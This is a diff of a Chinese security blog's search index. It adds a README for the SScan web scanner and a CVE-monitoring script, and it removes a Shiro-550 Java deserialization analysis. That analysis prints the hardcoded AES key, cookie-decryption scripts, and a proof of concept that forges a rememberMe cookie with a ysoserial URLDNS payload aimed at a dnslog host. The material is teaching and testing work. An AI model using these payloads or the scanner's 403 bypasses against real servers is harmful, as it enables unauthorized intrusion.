   是否使用fofa扩大目标，默认为True，通过在lib/config/setting.py </span><br></pre></td></tr></table></figure>
+
+<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><ul>
+<li><p><input checked="" disabled="" type="checkbox">  常见目录扫描，比如备份文件、配置文件、日志文件等等，具体见<code>rules</code>目录下的详细规则</p>
+</li>
+<li><p><input checked="" disabled="" type="checkbox">  信息泄露漏洞，比如.idea、 .git、.DS_Store、springboot等等，具体见<code>rules</code>目录下的详细规则</p>
+</li>
+<li><p><input checked="" disabled="" type="checkbox">  后台登录页面资产发现</p>
+</li>
+<li><p><input checked="" disabled="" type="checkbox">  403页面绕过，具体绕过规则在<code>lib/common/scanner.py</code>的196行的<code>bypass_403</code>函数</p>
+<p>  使用BurpSuite 实验室<a href="https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented">Lab: URL-based access control can be circumvented</a> 进行测试</p>
+<p>  <img src="https://raw.githubusercontent.com/yhy0/PicGoImg/master/sscan/20210311084904.png" alt="image-20210106105118466"></p>
+</li>
+<li><p><input checked="" disabled="" type="checkbox">  扫描某个网段，比如通过 <code>--network 24</code> 指定扫描C段资产，进行漏洞和信息发现</p>
+</li>
+<li><p><input checked="" disabled="" type="checkbox">  跳过存在CDN的IP，当检测到url解析的IP符合CDN特征时，不会将ip加入扫描目标中，只会扫描url</p>
+</li>
+<li><p><input checked="" disabled="" type="checkbox">  一些常见未授权和弱口令检测，目前支持：</p>
+<p>  redis、Hadoop、Hadoop yarn、docker、docker registry api、CouchDB、ftp、zookeeper、elasticsearch、memcached、mongodb、rsync、jenkins、jboss的未授权访问，mysql空口令、PostgreSQL 空口令 ，具体见<code>pocs/scripts</code> 目录</p>
+<p>  对于数据库口令检测，目前只是检测是否存在空口令检测，后续会考虑要不要加入一些弱口令，进行检测。像这样 <a href="https://github.com/se55i0n/DBScanner/blob/master/lib/exploit.py">https://github.com/se55i0n/DBScanner/blob/master/lib/exploit.py</a></p>
+</li>
+<li><p><input checked="" disabled="" type="checkbox">  当在<code> lib/config/setting.py</code>  文件中指定fofa api 信息时，会调用fofa接口，搜索更多的Web服务</p>
+</li>
+</ul>
+<h2 id="后续计划"><a href="#后续计划" class="headerlink" title="后续计划"></a>后续计划</h2><ul>
+<li><input disabled="" type="checkbox"> <del>将<a href="https://github.com/rtcatc/Packer-Fuzzer">Packer-Fuzzer</a>项目中的一些功能集成进去，能够对js文件中的敏感信息、API进行测试</del>，添加此功能有点臃肿，而且有现成的(不是我懒)，1.0版本准备添加指纹识别，记录一个目标的各种信息，并生成报告，后续可以筛选出目标使用<a href="https://github.com/rtcatc/Packer-Fuzzer">Packer-Fuzzer</a> 进行批量扫描</li>
+<li><input disabled="" type="checkbox"> 1.0版本添加指纹识别，记录一个目标的各种信息，并生成报告。</li>
+<li><input disabled="" type="checkbox"> 继续优化各模块</li>
+</ul>
+<h2 id="rules目录下的规则描述"><a href="#rules目录下的规则描述" class="headerlink" title="rules目录下的规则描述"></a>rules目录下的规则描述</h2><ul>
+<li><p>black.list 规则黑名单，命中则跳过</p>
+</li>
+<li><p>White.list 规则白名单 ，命中则认为存在薄弱点，加入结果</p>
+</li>
+<li><p>rules目录下的一些字段含义，rules目录下常见的格式就是这种</p>
+  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;WEB-INF&#x2F;applicationContext-slave.xml &#123;tag&#x3D;&quot;&lt;?xml&quot;&#125; &#123;status&#x3D;200&#125; &#123;type&#x3D;&quot;xml&quot;&#125; &#123;root_only&#125;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p><code>/WEB-INF/applicationContext-slave.xml </code>目录 ，必有</p>
+</li>
+<li><p><code>&#123;tag=&quot;&lt;?xml&quot;&#125; </code>可选， 如果有的话，会比对 response.text ,即返回的html页面中是否存在tag，若没有，认为不存在该目录。</p>
+</li>
+<li><p><code>&#123;status=200&#125; </code>可选， 目录对应的状态码， 也是 作为判断该目录是否存在的一个条件，会比对页面的状态码和规则的状态码一致 </p>
+</li>
+<li><p><code>&#123;type=&quot;xml&quot;&#125;</code> 可选，与返回头信息 content-type 字段比对，也是判断目录存在的一个条件</p>
+</li>
+<li><p><code>&#123;root_only&#125;</code> 可选， 这个是表示该目录只在网站根目录下存在，之后与网站根目录拼接，进行检测，比如 <a href="https://www.baidu.com/WEB-INF/applicationContext-slave.xml">https://www.baidu.com/WEB-INF/applicationContext-slave.xml</a> 这样检查一次， 在 <a href="https://www.baidu.com/test/">https://www.baidu.com/test/</a> 这样的二级目录，并不会拼接检查，提高效率 ，</p>
+<p> ps：必有：是指当想要自己添加规则时，必须添加的字段，可选：可以没有，但想要更加准确，最好写上。</p>
+<p> 具体匹配检测在<code>lib/common/scanner.py</code> 的523行</p>
+</li>
+</ol>
+</li>
+</ul>
+<h2 id="如何编写脚本插件"><a href="#如何编写脚本插件" class="headerlink" title="如何编写脚本插件"></a>如何编写脚本插件</h2><p>请参考scripts文件夹下的插件内容。self参数是一个Scanner对象(lib/common/scanner.py)，可使用Scanner对象的任意方法、属性。</p>
+<p><code>self.host</code> <code>self.port</code> 是目标主机和端口</p>
+<p><code>self.ports_open</code> 是开放的端口列表，是所有插件共享的。 一般不在插件执行过程中再单独扫描端口</p>
+<p><code>self.session</code> 是HTTP连接池</p>
+<p><code>self.http_request</code> 可发起HTTP GET请求</p>
+<p><code>self.index_headers</code> <code>self.index_status</code> <code>self.index_html_doc</code> 是请求首页后返回的，一旦扫描器发现有插件依赖，会预先请求首页，保存下来，被所有插件公用</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a href="https://github.com/lijiejie/BBScan.git">BBScan</a></li>
+<li><a href="https://github.com/shmilylty/OneForAll.git">oneforall</a> </li>
+<li><a href="https://github.com/sting8k/BurpSuite_403Bypasser">BurpSuite_403Bypasser</a></li>
+<li><a href="https://mp.weixin.qq.com/s?__biz=MzAwMzYxNzc1OA==&mid=2247489824&idx=1&sn=83d370a391fa8269c12848d87a62240a&chksm=9b393f91ac4eb687328e676b3ed0710078d5cb2d3185e0d38d5e7bd92403840d0fc224b443ba&mpshare=1&scene=24&srcid=12289jnCaJEnQZ4ZGqKk1uGX&sharer_sharetime=1609151769170&sharer_shareid=6806da86371afa965c2b99ffa8f84bab#rd">记一次403绕过技巧</a></li>
+<li><a href="http://www.langzi.fun/Asyncio%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B.html">Asyncio并发编程</a></li>
+<li><a href="https://github.com/test502git/Scanunauthorized">Scanunauthorized</a></li>
+<li><a href="https://github.com/timwhitez/Frog-Auth/blob/main/pocs/pocs.py">Frog-Auth</a></li>
+</ul>
+<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>本工具仅能在取得足够合法授权的企业安全建设中使用，在使用本工具过程中，您应确保自己所有行为符合当地的法律法规。<br>    如您在使用本工具的过程中存在任何非法行为，您将自行承担所有后果，本工具所有开发者和所有贡献者不承担任何法律及连带责任。<br>    除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。<br>    您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。</p>
+<h2 id="Star趋势"><a href="#Star趋势" class="headerlink" title="Star趋势"></a>Star趋势</h2><p><a href="https://starchart.cc/yhy0/SScan"><img src="https://starchart.cc/yhy0/SScan.svg" alt="Stargazers over time"></a>
+      </p>
+]]></content>
+      <categories>
+        <category>GitHub工具</category>
+      </categories>
+      <tags>
+        <tag>GitHub工具</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Windows提权-BypassUAC之劫持注册表实验</title>
     <url>/2021/01/19/Windows%E6%8F%90%E6%9D%83-BypassUAC%E4%B9%8B%E5%8A%AB%E6%8C%81%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%AE%9E%E9%AA%8C/</url>
     <content><![CDATA[<blockquote>
@@ -465,110 +702,39 @@
       </tags>
   </entry>
   <entry>
-    <title>Java反序列化漏洞分析(一)-Shiro550</title>
-    <url>/2021/05/21/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%B8%80)-Shiro550/</url>
+    <title>gitHub_cve_monitor</title>
+    <url>/2021/02/25/github_cve_monitor/</url>
     <content><![CDATA[<blockquote>
-<p>  本菜鸡算是第一次正式分析这种玩意，很烂，都是跟着网上的分析教程走一遍，算是打响java反序列化漏洞的第一枪。我还欠了两篇文章，记着呢。</p>
+<p>没事少矫情，有空多赚钱。</p>
 </blockquote>
-<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>Apache Shiro是一个开源安全框架，提供身份验证、授权、密码学和会话管理。在它编号为550的issue 中爆出严重的Java反序列化漏洞。</p>
-<p>在Apache Shiro&lt;=1.2.4版本中AES加密时采用的key是<strong>硬编码</strong>在代码中的，这就为伪造cookie提供了机会。只要rememberMe的AES加密密钥泄露，无论shiro是什么版本都会导致反序列化漏洞。</p>
-<p>Shiro的“记住我”功能是设置cookie中的rememberMe值来实现。当后端接收到来自未经身份验证的用户的请求时，它将通过执行以下操作来寻找他们记住的身份：</p>
-<ol>
-<li> 检索cookie中RememberMe的值</li>
-<li> Base64解码</li>
-<li> 使用AES解密</li>
-<li> 反序列化</li>
-</ol>
-<p>漏洞原因在于第三步，在Apache Shiro&lt;=1.2.4版本中AES加密时采用的key是<strong>硬编码</strong>在代码中的，于是我们就可以构造RememberMe的值，然后让其反序列化执行。</p>
-<blockquote>
-<p>  只要rememberMe的AES加密密钥泄露，无论shiro是什么版本都会导致反序列化漏洞。</p>
-</blockquote>
-<h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>首先下载源码，并切换有漏洞的版本</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/apache/shiro.git  </span><br><span class="line"><span class="built_in">cd</span> shiro</span><br><span class="line">git checkout shiro-root-1.2.4</span><br></pre></td></tr></table></figure>
+<h2 id="监控github上新增的cve编号项目漏洞，推送钉钉或者server酱"><a href="#监控github上新增的cve编号项目漏洞，推送钉钉或者server酱" class="headerlink" title="监控github上新增的cve编号项目漏洞，推送钉钉或者server酱"></a>监控github上新增的cve编号项目漏洞，推送钉钉或者server酱</h2><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>项目地址：<a href="https://github.com/yhy0/github-cve-monitor.git">https://github.com/yhy0/github-cve-monitor.git</a></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -m pip install dingtalkchatbot</span><br><span class="line">python3 github_cve_monitor.py</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210506223552.png" alt="image-20210506223546214"></p>
-<p>修改<code>samples/web/pom.xml</code>，支持jsp</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205022.png" alt="image-20210519210957110"></p>
-<ol>
-<li><p> Run</p>
-</li>
-<li><p> Edit Configurations</p>
-</li>
-<li><p> 添加TomcatServer(Local)</p>
-</li>
-<li><p> Server中配置Tomcat路径</p>
-</li>
-<li><p> Deployment中添加Artifact</p>
-</li>
-<li><p>选择sample-web:war exploded</p>
-<p> <img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205028.png" alt="image-20210519212838979"></p>
-<blockquote>
-<p>  这里若要使用burpsuite，注意端口不要和bp冲突</p>
-</blockquote>
-</li>
-</ol>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205034.png" alt="image-20210519210846672"></p>
-<p>然后运行即可</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205039.png" alt="image-20210519212950043"></p>
-<h2 id="0x03-代码分析"><a href="#0x03-代码分析" class="headerlink" title="0x03 代码分析"></a>0x03 代码分析</h2><p>根据 <a href="https://issues.apache.org/jira/browse/SHIRO-550">https://issues.apache.org/jira/browse/SHIRO-550</a> 描述</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205046.png" alt="image-20210519211422639"></p>
-<p>这是几个重要的点:</p>
-<ul>
-<li>  检索<code>RememberMe</code> cookie的值</li>
-<li>  Base64解码</li>
-<li>  使用AES解密</li>
-<li>  使用Java序列化（<code>ObjectInputStream</code>）反序列化。</li>
+<p>每3分钟检测一次github是否有新的cve漏洞提交记录，若有则通过server酱和钉钉机器人推送（二者配置一个即可）</p>
+<p>时间间隔修改在 58 行</p>
+<p>建议使用<a href="https://www.runoob.com/linux/linux-comm-screen.html">screen命令</a>运行在自己的linux vps后台上，就可以愉快的接收各种cve了</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">screen -S github_cve	<span class="comment">#创建一个screen，名字为github_cve，在新窗口运行本项目, 成功后直接叉掉该窗口, 项目就会在后台一直运行了</span></span><br><span class="line"></span><br><span class="line">screen -ls 		<span class="comment">#查看创建的screen</span></span><br><span class="line"></span><br><span class="line">screen -r github_cve	<span class="comment">#连接github_cve后台screen，如果存在的话</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>钉钉机器人配置在 33行的 dingding函数中，需要钉钉建群，添加钉钉机器人，复制 webhook 替换即可</p>
+<p>server酱配置在 40行的 server 函数中，ps：因微信的原因，server酱的旧版将在2021年4月后下线，新版以企业微信为主，这里使用的是旧版，想改新版的话，搞个企业微信，从新配置server酱，使用新链接 sctapi.ftqq.com</p>
+<p>具体查看server酱官方，<a href="http://sc.ftqq.com/">http://sc.ftqq.com/</a> ，配置简单，只需要将脚本中的uri换掉即可</p>
+<p><a href="https://sct.ftqq.com/">server酱新版</a>支持多通道（微信、客户端、群机器人、邮件和短信）</p>
+<h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210225093627.png" alt="image-20210225090416314"></p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210225094630.jpg" alt="751614217534_.pic"></p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210225093635.png" alt="image-20210225092350481"></p>
+<p>项目地址：<a href="https://github.com/yhy0/github-cve-monitor.git">https://github.com/yhy0/github-cve-monitor.git</a></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li>  洛米唯熊     <a href="https://my.oschina.net/u/4581868/blog/4380482">https://my.oschina.net/u/4581868/blog/4380482</a></li>
+<li>  kiang70      <a href="https://github.com/kiang70/Github-Monitor">https://github.com/kiang70/Github-Monitor</a></li>
 </ul>
-<h3 id="3-1-rememberMe-cookie"><a href="#3-1-rememberMe-cookie" class="headerlink" title="3.1 rememberMe cookie"></a>3.1 rememberMe cookie</h3><p>先来瞧瞧这个cookie，进入登录界面，在登录时，勾选<code>Remember Me</code><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205052.png" alt="image-20210519213228149"></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rememberMe=+3nYB8HVKgNT9ewnrYDz2kMZA2QhOJucwaUx76IB0ya4ZesDlsfmreeeZ1ngxazK7jEsPKIWkxfdBfVEhPI+fiKqfyV0+tH4U+RcWPwITXq4NgY415Edvbb7Wmx6j+KW6C7RaEMf6A9ib8KvOwZizhXUw8d87EyaXpPd6RzJghoOJJoq7hP4gxLv1L5i9u1EZriLjUcnfaufS5R3jevlVgpYAMhuDWK8m9/lJZvK/IWm4/5RAmiDQEirwB8r57x/tZ71fs7baFXOZVueN/V7dJv8ySJP+ozQ/cy3bcx6+ZgF/MJvn4e5nLtM01u8jgg1rTk7fW+0jt61Znq1mq0BNnzAraTZg+0pSU36+aCiolYLh82BX/jJHweu9COVUyONKrXBcm8mPOz0vO8Kjq581OmACdiQgC1kI6qHrr+GloO0xlk4MJZiVzzYm5YdGkgDOPNGO2Lfh4U5hmprEzlf+5/7zwKILsMtOVrqZG5AXXW1XKTch62gq7jAWAXBmyIU</span><br></pre></td></tr></table></figure>
-
-<p>使用<code>Base64</code>解码存储为二进制文件</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author : yhy</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">rememberMe = <span class="string">&#x27;+3nYB8HVKgNT9ewnrYDz2kMZA2QhOJucwaUx76IB0ya4ZesDlsfmreeeZ1ngxazK7jEsPKIWkxfdBfVEhPI+fiKqfyV0+tH4U+RcWPwITXq4NgY415Edvbb7Wmx6j+KW6C7RaEMf6A9ib8KvOwZizhXUw8d87EyaXpPd6RzJghoOJJoq7hP4gxLv1L5i9u1EZriLjUcnfaufS5R3jevlVgpYAMhuDWK8m9/lJZvK/IWm4/5RAmiDQEirwB8r57x/tZ71fs7baFXOZVueN/V7dJv8ySJP+ozQ/cy3bcx6+ZgF/MJvn4e5nLtM01u8jgg1rTk7fW+0jt61Znq1mq0BNnzAraTZg+0pSU36+aCiolYLh82BX/jJHweu9COVUyONKrXBcm8mPOz0vO8Kjq581OmACdiQgC1kI6qHrr+GloO0xlk4MJZiVzzYm5YdGkgDOPNGO2Lfh4U5hmprEzlf+5/7zwKILsMtOVrqZG5AXXW1XKTch62gq7jAWAXBmyIU&#x27;</span></span><br><span class="line"></span><br><span class="line">rememberMe_64 = base64.b64decode(rememberMe)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;rememberMe&quot;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f.write(rememberMe_64)</span><br></pre></td></tr></table></figure>
-
-<p>内容如下:<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205104.png" alt="image-20210519214639370"></p>
-<p>上述内容中并没有在<a href="">初探Java反序列化漏洞（一）</a>中提到过的序列化的数据流以魔术数字和版本号<code>AC ED 00 05</code> 等字样。这是因为上述关键步骤中提到了<code>AES解密</code>，所以需要去跟一下源码。</p>
-<h3 id="3-2-Shiro-500-中的-AES-解密"><a href="#3-2-Shiro-500-中的-AES-解密" class="headerlink" title="3.2 Shiro 500 中的 AES 解密"></a>3.2 Shiro 500 中的 AES 解密</h3><p>在IDEA中<code>ctrl+shift+f</code> 全局搜索<code>AES</code><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205115.png" alt="image-20210520201956272"></p>
-<p>在<code>src/main/java/org/apache/shiro/mgt/AbstractRememberMeManager.java</code>中找到了</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-<p><strong>Base64.decode(“kPH+bIxk5D2deZiIxcaaaA==”)</strong> 就是我们要找的硬编码密钥，因为AES是对称加密，即加密密钥也同样是解密密钥。</p>
-<p>然后看看shiro是怎么处理解密的，向下看，找到</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Decrypts the byte array using the configured &#123;<span class="doctag">@link</span> #getCipherService() cipherService&#125;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> encrypted the encrypted byte array to decrypt</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the decrypted byte array returned by the configured &#123;<span class="doctag">@link</span> #getCipherService () cipher&#125;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] decrypt(<span class="keyword">byte</span>[] encrypted) &#123;</span><br><span class="line">    <span class="keyword">byte</span>[] serialized = encrypted;</span><br><span class="line">    CipherService cipherService = getCipherService();</span><br><span class="line">    <span class="keyword">if</span> (cipherService != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());</span><br><span class="line">        serialized = byteSource.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> serialized;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>函数名<code>decrypt</code>，显而易见，是处理解密的，<code>cipherService</code>是一个接口,调用了其中的<code>decrypt</code>解密方法，需要两个变量<code>encrypted</code>(被加密的数组) 和 <code>getDecryptionCipherKey()</code>(获取解密秘钥)，前面说了AES是对称加密，即加密密钥也同样是解密密钥。而且从程序中也能看到，确实是同一个，通过在该类中查找<code>setDecryptionCipherKey()</code>方法，可以看到<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205124.png" alt="image-20210520204036228"></p>
-<p>再搜索<code>setCipherKey</code>，可以看到构造方法中传入了<code>DEFAULT_CIPHER_KEY_BYTES</code>也就是<code>Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)</code>的值<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205131.png" alt="image-20210520204113812"></p>
-<p>然后再看一下<code>CipherService</code>这个接口的<code>decrypt</code>的具体实现，<code>ctrl+右键</code>跟进去看看<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205138.png" alt="image-20210520205000830"></p>
-<p>这只是个接口，全局搜索<code>implements CipherService</code> 发现<code>src/main/java/org/apache/shiro/crypto/JcaCipherService.java</code>实现了<code>CipherService</code>接口，进去看看<code>decrypt</code>方法</p>
-<p>为了方便，我们在这里下个断点，发现是<code>CBC</code>模式，并且 <code>iv</code>偏移量的值为 **byte[] iv = new byte[16] ** <img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520215312.png" alt="image-20210520215309770"></p>
-<p>利用下面的脚本解密之前<code>base64解码</code>后生成的<code>rememberMe</code>文件得到<code>decrypt.bin</code>文件</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pip install pycrypto</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_rememberme_file</span>(<span class="params">filename</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fpr:</span><br><span class="line">        key  =  <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">        mode =  AES.MODE_CBC</span><br><span class="line">        IV   = <span class="string">b&#x27; &#x27;</span> * <span class="number">16</span></span><br><span class="line">        encryptor = AES.new(base64.b64decode(key), mode, IV=IV)</span><br><span class="line">        remember_bin = encryptor.decrypt(fpr.read())</span><br><span class="line">    <span class="keyword">return</span> remember_bin</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;decrypt.bin&quot;</span>, <span class="string">&#x27;wb+&#x27;</span>) <span class="keyword">as</span> fpw:</span><br><span class="line">        fpw.write(decode_rememberme_file(sys.argv[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520221430.png" alt="image-20210520221418998"></p>
-<p>这是 Java 序列化的标志，说明解密成功</p>
-<h3 id="3-3-反序列化"><a href="#3-3-反序列化" class="headerlink" title="3.3 反序列化"></a>3.3 反序列化</h3><p>看看解密之后的操作，回到<code>src/main/java/org/apache/shiro/mgt/AbstractRememberMeManager.java</code>类中，看看，从哪里调用了<code>decrypt</code>函数，<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521074327.png" alt="image-20210521073527745"></p>
-<p>在<code>convertBytesToPrincipals</code>这里解密之后，执行了反序列化<code>deserialize</code>，进去瞅瞅<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521074332.png" alt="image-20210521074103621"></p>
-<p>通过获取<code>getSerializer()</code>来调用反序列化，再看看<code>SetSerializer</code><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521074338.png" alt="image-20210521074230279"></p>
-<p><strong>src/main/java/org/apache/shiro/io/DefaultSerializer.java</strong><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521074341.png" alt="image-20210521074304324"></p>
-<p>这里使用的是默认反序列化类，没有任何检验，<code>readobject()</code>触发反序列化!<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521092011.png" alt="image-20210521074629505"></p>
-<h2 id="0x04-漏洞探测"><a href="#0x04-漏洞探测" class="headerlink" title="0x04 漏洞探测"></a>0x04 漏洞探测</h2><p>现在我们知道了<strong>shiro550</strong>在获取到<strong>rememberMe cookie</strong>的值后，通过硬编码的KEY **kPH+bIxk5D2deZiIxcaaaA==<strong>进行AES解密，解密完成之后直接调用默认的反序列化的</strong>readobject()**方法，没有经过任何的校验。</p>
-<p>具体的 <strong>Payload</strong> 也就呼之欲出了，将<code>payload</code>通过AES加密伪造<strong>rememberMe cookie</strong>,我们通过刚才的解密流程知道<strong>shiro550</strong>采用的<strong>CBC</strong>模式、**byte[] iv = new byte[16]**， 通过脚本伪造，利用<code>ysoserial.jar</code> 神器生成<code>URLDNS</code>探测的payload进行探测(shiro550自带来commons-collections3.2.1，关于commons-collections的相关漏洞，后续分析)<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521092006.png" alt="image-20210521091543563"></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># －*-* coding:utf-8</span></span><br><span class="line"><span class="comment"># @Time    :  2020/10/16 17:36</span></span><br><span class="line"><span class="comment"># @Author  : nice0e3</span></span><br><span class="line"><span class="comment"># @FileName: poc.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    ：https://www.cnblogs.com/nice0e3/</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rememberme</span>(<span class="params">command</span>):</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">&#x27;ysoserial.jar&#x27;</span>, <span class="string">&#x27;URLDNS&#x27;</span>, command],</span><br><span class="line">                             stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = <span class="string">b&#x27; &#x27;</span> * <span class="number">16</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 替换dnslog </span></span><br><span class="line">    payload = rememberme(<span class="string">&#x27;http://5fzd8f.dnslog.cn&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload.cookie&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> fpw:</span><br><span class="line"></span><br><span class="line">        print(<span class="string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br><span class="line">        res = <span class="string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode())</span><br><span class="line">        fpw.write(res)</span><br></pre></td></tr></table></figure>
-
-<p>运行生成</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">rememberMe=Y3M07legS/64hNfAmb+zfY1Ch/sXxGbop7rMR3YgWuFwTmdZEGj1q0oaHMowhUpUopo4XNjBkIDbn+w4Zhq0QO+9GXX4+hZA67NiM5U6sXcxtxLZCdlRB4JlrT8JrtTs+OyejDVh2HXLgI29lmMSDVoVW5OV3EHISFbFS+MmQv6JGqt60OZHxw6y1uhwYcWiRZ2kqGwDbNE/Xj+vNA1/5CdvnElY3jVvo8YJ8Suy8zznVuMlR2OsjksaHel8dXoUSXRiTAsMnn0SJIqKm7KI98YqTQaSn4F7VnEqaaNyciQwgOoOV/MphOWjVcTWsEDgdUjT5WgI+pJSZpX9JIo1XT75SPpWkiIw9Sseptaor5fsPMPNuk/lf5bWSpnwFTlTUuClsDJbOXjgvcew77i9tw==</span><br></pre></td></tr></table></figure>
-
